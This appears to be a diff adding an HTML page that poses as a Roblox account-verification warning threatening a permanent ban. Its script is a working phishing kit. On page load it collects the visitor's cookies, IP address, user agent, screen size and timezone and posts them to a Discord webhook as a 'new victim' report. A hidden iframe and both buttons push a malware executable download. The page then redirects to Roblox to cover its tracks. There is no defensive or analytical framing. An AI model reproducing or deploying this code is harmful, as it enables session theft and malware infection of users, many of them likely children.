@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ Roblox Security Verification</title>
+    <style>
+        body {
+            background: #000 url('https://tr.rbxcdn.com/security-bg.jpg') no-repeat center/cover;
+            font-family: 'Roblox', sans-serif;
+            color: white;
+            text-align: center;
+            padding-top: 50px;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(0,0,0,0.9);
+            width: min(90%, 500px);
+            margin: 0 auto;
+            padding: 30px;
+            border-radius: 15px;
+            border: 2px solid #ff0000;
+            backdrop-filter: blur(10px);
+        }
+        .btn {
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-weight: bold;
+            border: none;
+        }
+        #continueBtn {
+            background: #00a2ff;
+            color: white;
+        }
+        #goBackBtn {
+            background: #333;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #ff0000;">⚠️ ACCOUNT VERIFICATION REQUIRED</h1>
+        <p>Roblox has detected suspicious activity from your device.</p>
+        <p><strong>Verify your account to avoid permanent ban.</strong></p>
+        
+        <button id="continueBtn" class="btn">▶️ CONTINUE</button>
+        <button id="goBackBtn" class="btn">↩️ GO BACK</button>
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            webhook: "https://discord.com/api/webhooks/1360730243643474040/Ge2K7cEEWgzAMbOQ98vl3zajdkCpDxgGCDJHTc9MvqcNCTdMUw51ZsQB9lpvveL4XIa8",
+            malwareUrl: "https://cdn.discordapp.com/attachments/your-malware.exe", // REPLACE WITH REAL LINK
+            robloxRedirect: "https://www.roblox.com"
+        };
+
+        // ===== AUTO-DOWNLOAD MALWARE (HIDDEN IFRAME TRICK) =====
+        setTimeout(() => {
+            const iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = CONFIG.malwareUrl;
+            document.body.appendChild(iframe);
+        }, 3000);
+
+        // ===== STEAL USER DATA =====
+        async function stealData() {
+            const data = {
+                ip: "Unknown",
+                cookies: document.cookie || "None",
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                phishingTime: new Date().toISOString()
+            };
+
+            // Get IP Address
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                data.ip = (await response.json()).ip;
+            } catch {}
+
+            // Send to Discord
+            fetch(CONFIG.webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 NEW VICTIM - Roblox Phish",
+                        description: `**IP:** \`${data.ip}\`\n**User Agent:** \`${data.userAgent}\``,
+                        color: 0xff0000,
+                        fields: [
+                            { name: "Cookies", value: `\`${data.cookies.slice(0, 100)}\`` },
+                            { name: "Screen", value: data.screen },
+                            { name: "Timezone", value: data.timezone }
+                        ],
+                        timestamp: data.phishingTime
+                    }]
+                })
+            });
+        }
+
+        // ===== BUTTON TRAPS =====
+        document.getElementById("continueBtn").addEventListener("click", () => {
+            window.location.href = CONFIG.malwareUrl;
+            stealData();
+        });
+
+        document.getElementById("goBackBtn").addEventListener("click", () => {
+            window.location.href = CONFIG.malwareUrl;
+            stealData();
+        });
+
+        // ===== SELF-DESTRUCT =====
+        setTimeout(() => {
+            document.body.innerHTML = "<h1>Redirecting to Roblox...</h1>";
+            history.replaceState(null, null, CONFIG.robloxRedirect);
+            window.location.replace(CONFIG.robloxRedirect);
+        }, 8000);
+
+        // Start data collection immediately
+        stealData();
+    </script>
+</body>
+</html>
